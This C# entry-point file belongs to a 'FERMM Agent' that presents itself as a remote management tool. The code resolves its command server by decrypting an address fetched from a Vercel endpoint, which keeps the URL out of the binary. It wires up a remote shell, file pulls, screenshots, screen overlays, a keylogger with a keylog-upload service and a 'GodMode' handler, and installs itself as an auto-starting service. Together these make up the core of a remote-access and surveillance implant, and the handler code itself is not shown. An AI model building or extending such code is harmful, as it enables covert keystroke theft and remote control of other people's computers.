using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using FermmAgent;
using FermmAgent.Services;
using FermmAgent.Handlers;
using FermmAgent.Transport;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Serilog;

namespace FermmAgent;

public class Program
{
    public static async Task<int> Main(string[] args)
    {
        try
        {
            // Check for service installation/uninstallation commands
            if (args.Length > 0)
            {
                var command = args[0].ToLower();
                switch (command)
                {
                    case "install":
                        return InstallService();
                    case "uninstall":
                        return UninstallService();
                    case "start-service":
                        return StartService();
                    case "stop-service":
                        return StopService();
                    case "status":
                        return CheckServiceStatus();
                }
            }

            return await ParseAndRunAsync(args);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Fatal error: {ex.Message}");
            return 1;
        }
    }

static async Task<int> ParseAndRunAsync(string[] args)
{
    string? serverUrl = null;
    string? confirmUrl = null;
    
    // Parse arguments
    for (int i = 0; i < args.Length; i++)
    {
        switch (args[i].ToLower())
        {
            case "-s":
            case "--server":
                if (i + 1 < args.Length)
                {
                    serverUrl = args[++i];
                }
                break;
                
            case "-confirm":
            case "--confirm":
                if (i + 1 < args.Length)
                {
                    confirmUrl = args[++i];
                }
                break;
                
            case "-cs":
            case "--change-server":
                ChangeServer();
                return 0;
                
            case "--show-config":
            case "-sc":
                ShowConfig();
                return 0;
                
            case "-h":
            case "--help":
                ShowHelp();
                return 0;
        }
    }
    
    // If no args, just run the agent with saved config
    if (args.Length == 0)
    {
        await RunAgentWithAutoConfig();
        return 0;
    }
    
    // If we have -s and/or -confirm, resolve the server URL
    if (serverUrl != null || confirmUrl != null)
    {
        var resolvedUrl = await ResolveServerUrlAsync(serverUrl, confirmUrl);
        if (resolvedUrl != null)
        {
            Environment.SetEnvironmentVariable("FERMM_SERVER_URL", resolvedUrl);
            await RunAgent(args);
            return 0;
        }
        else
        {
            Console.WriteLine("✗ Could not determine server URL. Agent not started.");
            return 1;
        }
    }
    
    return 0;
}

static async Task<string?> ResolveServerUrlAsync(string? serverUrl, string? confirmUrl)
{
    var vercelService = new VercelConfigService();
    
    // Step 1: Try the -s server first
    if (!string.IsNullOrEmpty(serverUrl))
    {
        Console.WriteLine($"📡 Testing connection to: {serverUrl}");
        
        if (await TestServerConnectionAsync(serverUrl))
        {
            Console.WriteLine($"✓ Server reachable: {serverUrl}");
            
            // Save to config.dat
            var configData = new VercelConfigService.ConfigData
            {
                ServerUrl = serverUrl,
                ConfirmUrl = confirmUrl ?? "",
                LastUpdated = DateTime.UtcNow.ToString("o")
            };
            var configPath = Path.Combine(AppContext.BaseDirectory, "config.dat");
            var json = System.Text.Json.JsonSerializer.Serialize(configData, 
                new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
            await File.WriteAllTextAsync(configPath, json);
            Console.WriteLine($"✓ Config saved to: {configPath}");
            
            return serverUrl;
        }
        
        Console.WriteLine($"✗ Server unreachable: {serverUrl}");
    }
    
    // Step 2: Fall back to -confirm to fetch HOST_URL via RSA
    if (!string.IsNullOrEmpty(confirmUrl))
    {
        Console.WriteLine($"📡 Falling back to confirm URL: {confirmUrl}");
        var hostUrl = await vercelService.FetchHostUrlAsync(confirmUrl);
        if (hostUrl != null)
        {
            return hostUrl;
        }
    }
    
    // Step 3: Try loading from saved config.dat
    var savedConfig = vercelService.LoadConfig();
    if (savedConfig != null && !string.IsNullOrEmpty(savedConfig.ServerUrl))
    {
        Console.WriteLine($"📁 Using saved config: {savedConfig.ServerUrl}");
        return savedConfig.ServerUrl;
    }
    
    return null;
}

static async Task<bool> TestServerConnectionAsync(string serverUrl)
{
    try
    {
        using var http = new HttpClient();
        http.Timeout = TimeSpan.FromSeconds(5);
        
        var response = await http.GetAsync($"{serverUrl.TrimEnd('/')}/api/devices/discover");
        return response.IsSuccessStatusCode;
    }
    catch
    {
        return false;
    }
}

static async Task RunAgentWithAutoConfig()
{
    // Try to load from environment first
    var envUrl = Environment.GetEnvironmentVariable("FERMM_SERVER_URL");
    if (!string.IsNullOrEmpty(envUrl))
    {
        await RunAgent(Array.Empty<string>());
        return;
    }
    
    // Try to load from config.dat
    var vercelService = new VercelConfigService();
    var savedConfig = vercelService.LoadConfig();
    
    if (savedConfig != null && !string.IsNullOrEmpty(savedConfig.ServerUrl))
    {
        Console.WriteLine($"📁 Loading server from config.dat: {savedConfig.ServerUrl}");
        
        // Test if server is reachable
        if (await TestServerConnectionAsync(savedConfig.ServerUrl))
        {
            Console.WriteLine($"✓ Server reachable");
            Environment.SetEnvironmentVariable("FERMM_SERVER_URL", savedConfig.ServerUrl);
            await RunAgent(Array.Empty<string>());
            return;
        }
        
        Console.WriteLine($"✗ Saved server unreachable: {savedConfig.ServerUrl}");
        
        // Try to refresh from confirmUrl if available
        if (!string.IsNullOrEmpty(savedConfig.ConfirmUrl))
        {
            Console.WriteLine($"📡 Refreshing from confirm URL: {savedConfig.ConfirmUrl}");
            var newUrl = await vercelService.FetchHostUrlAsync(savedConfig.ConfirmUrl);
            if (newUrl != null)
            {
                Environment.SetEnvironmentVariable("FERMM_SERVER_URL", newUrl);
                await RunAgent(Array.Empty<string>());
                return;
            }
        }
    }
    
    Console.WriteLine(@"✗ No server configuration found.

Please run with -s and/or -confirm flags:
  fermm-agent -s http://your-server.com
  fermm-agent -confirm https://linkify-ten-sable.vercel.app -s http://localhost
  fermm-agent -confirm https://linkify-ten-sable.vercel.app

Or install as a Windows service:
  fermm-agent install

The -confirm flag fetches HOST_URL from a Vercel endpoint using RSA encryption.
The -s flag specifies the primary server (tested first).
");
}

static async Task RunAgent(string[] args)
{
    var builder = Host.CreateApplicationBuilder(args);
    
    // Configure for Windows Service if running as service
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            builder.Services.AddWindowsService(options =>
            {
                options.ServiceName = "FERMMAgent";
            });
        }
    else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
    {
        builder.Services.AddSystemd();
    }
    
    // Register HTTP client factory first
    builder.Services.AddHttpClient();
    
    // Register HTTP clients with base address
    builder.Services.AddHttpClient("FermmAgent", client =>
    {
        var config = AgentConfig.LoadFromEnvironment();
        if (!string.IsNullOrEmpty(config.ServerUrl))
        {
            client.BaseAddress = new Uri(config.ServerUrl.TrimEnd('/') + "/");
        }
        client.Timeout = TimeSpan.FromSeconds(30);
    });

    // Register config
    var config = AgentConfig.LoadFromEnvironment();
    builder.Services.AddSingleton(config);

    // Register handlers
    builder.Services.AddSingleton<ShellHandler>();
    builder.Services.AddSingleton<ProcessHandler>();
    builder.Services.AddSingleton<FileHandler>();
    builder.Services.AddSingleton<ScreenshotHandler>();
    builder.Services.AddSingleton<KeyloggerHandler>();
    builder.Services.AddSingleton<SysInfoHandler>();
    builder.Services.AddSingleton<GodModeHandler>();
    builder.Services.AddSingleton<ScriptHandler>();
    builder.Services.AddSingleton<FilePullHandler>();
    builder.Services.AddSingleton<OverlayHandler>();
    
    // Register services
    builder.Services.AddSingleton<CommandDispatcher>();
    builder.Services.AddSingleton<WsClient>();
    builder.Services.AddSingleton<PollClient>();
    builder.Services.AddSingleton<DiscoveryService>();
    builder.Services.AddSingleton<VercelConfigService>();
    builder.Services.AddSingleton<OverlayService>();
    builder.Services.AddHostedService<TaskQueueService>();
    builder.Services.AddHostedService<KeylogUploadService>();
    builder.Services.AddHostedService<AgentService>();

    // Configure logging for service
    builder.Logging.ClearProviders();
    
    if (Environment.UserInteractive && !args.Contains("--service"))
    {
        // Console mode - interactive
        builder.Logging.AddConsole();
    }
    else
    {
        // Service mode - use Event Log on Windows or file on Linux
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            try
            {
                builder.Logging.AddEventLog(eventLogSettings =>
                {
                    eventLogSettings.SourceName = "FERMM Agent";
                    eventLogSettings.LogName = "Application";
                });
            }
            catch
            {
                // Fallback to file if EventLog fails
                var logPath = Path.Combine(AppContext.BaseDirectory, "logs", "fermm-agent.log");
                Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);
                
                Log.Logger = new LoggerConfiguration()
                    .WriteTo.File(logPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
                    .CreateLogger();
                    
                builder.Logging.AddSerilog();
            }
        }
        else
        {
            // For Linux, log to file
            var logPath = "/var/log/fermm-agent.log";
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);
                
                Log.Logger = new LoggerConfiguration()
                    .WriteTo.File(logPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
                    .CreateLogger();
                    
                builder.Logging.AddSerilog();
            }
            catch
            {
                // Fallback to local directory
                var localLogPath = Path.Combine(AppContext.BaseDirectory, "logs", "fermm-agent.log");
                Directory.CreateDirectory(Path.GetDirectoryName(localLogPath)!);
                
                Log.Logger = new LoggerConfiguration()
                    .WriteTo.File(localLogPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
                    .CreateLogger();
                    
                builder.Logging.AddSerilog();
            }
        }
    }
    
    builder.Logging.SetMinimumLevel(LogLevel.Information);

    var host = builder.Build();
    await host.RunAsync();
}

static void SetServer(string url)
{
    try
    {
        Console.WriteLine($"Setting server to: {url}");
        var configMgr = new FermmAgent.Services.ConfigurationManager();
        configMgr.SetServerUrl(url);
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error saving server URL: {ex.Message}");
    }
}

static void ChangeServer()
{
    Console.WriteLine("Interactive server change:");
    Console.Write("Enter server URL: ");
    var url = Console.ReadLine();
    if (!string.IsNullOrWhiteSpace(url))
    {
        SetServer(url);
    }
    else
    {
        Console.WriteLine("No URL provided. Cancelled.");
    }
}

static void ShowConfig()
{
    var configMgr = new FermmAgent.Services.ConfigurationManager();
    configMgr.PrintConfig();
    
    // Also show config.dat
    Console.WriteLine();
    var vercelService = new VercelConfigService();
    var savedConfig = vercelService.LoadConfig();
    if (savedConfig != null)
    {
        Console.WriteLine("config.dat:");
        Console.WriteLine($"  Server URL: {savedConfig.ServerUrl}");
        Console.WriteLine($"  Confirm URL: {savedConfig.ConfirmUrl}");
        Console.WriteLine($"  Last Updated: {savedConfig.LastUpdated}");
    }
    else
    {
        Console.WriteLine("config.dat: (not found)");
    }
}

static void ShowHelp()
{
    Console.WriteLine(@"
FERMM Agent - Remote Management Agent

Usage:
  fermm-agent                                        Run agent (uses saved config)
  fermm-agent -s <url>                              Set primary server URL
  fermm-agent -confirm <vercel-url>                 Fetch HOST_URL from Vercel endpoint
  fermm-agent -confirm <vercel-url> -s <url>        Try -s first, fall back to -confirm
  fermm-agent -cs                                   Change server URL interactively
  fermm-agent --show-config                         Display current configuration
  fermm-agent -h, --help                            Show this help message

Service Management (Windows):
  fermm-agent install                               Install as Windows service
  fermm-agent uninstall                             Remove Windows service
  fermm-agent start-service                         Start the service
  fermm-agent stop-service                          Stop the service
  fermm-agent status                                Check service status

Examples:
  fermm-agent -s http://192.168.1.100:8000
  fermm-agent -confirm https://linkify-ten-sable.vercel.app
  fermm-agent -confirm https://linkify-ten-sable.vercel.app -s http://localhost
  fermm-agent install
  fermm-agent --show-config

Configuration Priority:
  1. -s <url>: Test this server first
  2. -confirm <url>: If -s fails or not provided, fetch HOST_URL via RSA
  3. config.dat: Use saved configuration
  4. FERMM_SERVER_URL env var: Environment variable fallback

The -confirm flag uses private_rsa.key to decrypt HOST_URL from a Vercel endpoint.
This allows dynamic server configuration without hardcoding the URL in the binary.
");
}

#region Service Management

static int InstallService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Service installation is only supported on Windows. Use systemd on Linux.");
        return CreateSystemdService();
    }

    try
    {
        var exePath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(exePath))
        {
            Console.WriteLine("✗ Could not determine executable path");
            return 1;
        }

        // Check if running as administrator
        if (!IsRunningAsAdmin())
        {
            Console.WriteLine("✗ Administrator privileges required to install service");
            Console.WriteLine("  Please run as administrator or use 'Run as administrator'");
            return 1;
        }

        var serviceName = "FERMMAgent";
        var displayName = "FERMM Agent Service";
        var description = "FERMM Remote Management Agent - Provides remote system management capabilities";

        // Create the service
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"create \"{serviceName}\" binPath= \"{exePath}\" DisplayName= \"{displayName}\" start= auto",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            // Set description
            var descStartInfo = new ProcessStartInfo
            {
                FileName = "sc",
                Arguments = $"description \"{serviceName}\" \"{description}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(descStartInfo)?.WaitForExit();

            Console.WriteLine($"✓ Service '{serviceName}' installed successfully");
            Console.WriteLine($"  Display Name: {displayName}");
            Console.WriteLine($"  Executable: {exePath}");
            Console.WriteLine($"  Start Type: Automatic");
            Console.WriteLine();
            Console.WriteLine("To start the service:");
            Console.WriteLine($"  fermm-agent start-service");
            Console.WriteLine($"  net start {serviceName}");
            Console.WriteLine($"  sc start {serviceName}");
            
            return 0;
        }
        else
        {
            var error = process?.StandardError.ReadToEnd() ?? "Unknown error";
            Console.WriteLine($"✗ Failed to install service: {error}");
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error installing service: {ex.Message}");
        return 1;
    }
}

static int UninstallService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Service uninstallation is only supported on Windows. Use systemctl on Linux.");
        return 1;
    }

    try
    {
        if (!IsRunningAsAdmin())
        {
            Console.WriteLine("✗ Administrator privileges required to uninstall service");
            return 1;
        }

        var serviceName = "FERMMAgent";

        // Stop the service first
        StopService();

        // Delete the service
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"delete \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"✓ Service '{serviceName}' uninstalled successfully");
            return 0;
        }
        else
        {
            var error = process?.StandardError.ReadToEnd() ?? "Unknown error";
            Console.WriteLine($"✗ Failed to uninstall service: {error}");
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error uninstalling service: {ex.Message}");
        return 1;
    }
}

static int StartService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Use: systemctl start fermm-agent");
        return 1;
    }

    try
    {
        var serviceName = "FERMMAgent";
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"start \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"✓ Service '{serviceName}' started successfully");
            return 0;
        }
        else
        {
            var output = process?.StandardOutput.ReadToEnd() ?? "";
            var error = process?.StandardError.ReadToEnd() ?? "";
            Console.WriteLine($"✗ Failed to start service: {output} {error}".Trim());
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error starting service: {ex.Message}");
        return 1;
    }
}

static int StopService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Use: systemctl stop fermm-agent");
        return 1;
    }

    try
    {
        var serviceName = "FERMMAgent";
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"stop \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"✓ Service '{serviceName}' stopped successfully");
            return 0;
        }
        else
        {
            var output = process?.StandardOutput.ReadToEnd() ?? "";
            Console.WriteLine($"Service stop result: {output}");
            return 0; // Stop might fail if already stopped, that's OK
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error stopping service: {ex.Message}");
        return 1;
    }
}

static int CheckServiceStatus()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Use: systemctl status fermm-agent");
        return 1;
    }

    try
    {
        var serviceName = "FERMMAgent";
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"query \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        var output = process?.StandardOutput.ReadToEnd() ?? "";
        var error = process?.StandardError.ReadToEnd() ?? "";

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"Service Status for '{serviceName}':");
            Console.WriteLine(output);
            return 0;
        }
        else
        {
            Console.WriteLine($"Service '{serviceName}' is not installed or not accessible");
            if (!string.IsNullOrEmpty(error))
            {
                Console.WriteLine($"Error: {error}");
            }
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error checking service status: {ex.Message}");
        return 1;
    }
}

static bool IsRunningAsAdmin()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        return false;

    try
    {
        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
        var principal = new System.Security.Principal.WindowsPrincipal(identity);
        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }
    catch
    {
        return false;
    }
}

static int CreateSystemdService()
{
    try
    {
        var exePath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(exePath))
        {
            Console.WriteLine("✗ Could not determine executable path");
            return 1;
        }

        var serviceContent = $@"[Unit]
Description=FERMM Remote Management Agent
After=network.target

[Service]
Type=notify
ExecStart={exePath}
Restart=always
RestartSec=5
User=fermm
Group=fermm
WorkingDirectory={Path.GetDirectoryName(exePath)}

# Security settings
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/log /tmp

[Install]
WantedBy=multi-user.target
";

        var servicePath = "/etc/systemd/system/fermm-agent.service";
        
        Console.WriteLine($"Creating systemd service file at: {servicePath}");
        Console.WriteLine();
        Console.WriteLine("Service content:");
        Console.WriteLine(serviceContent);
        Console.WriteLine();
        Console.WriteLine("To complete installation, run as root:");
        Console.WriteLine($"  sudo tee {servicePath} << 'EOF'");
        Console.WriteLine(serviceContent.TrimEnd());
        Console.WriteLine("EOF");
        Console.WriteLine("  sudo systemctl daemon-reload");
        Console.WriteLine("  sudo systemctl enable fermm-agent");
        Console.WriteLine("  sudo systemctl start fermm-agent");
        
        return 0;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error creating systemd service: {ex.Message}");
        return 1;
    }
}

#endregion

}
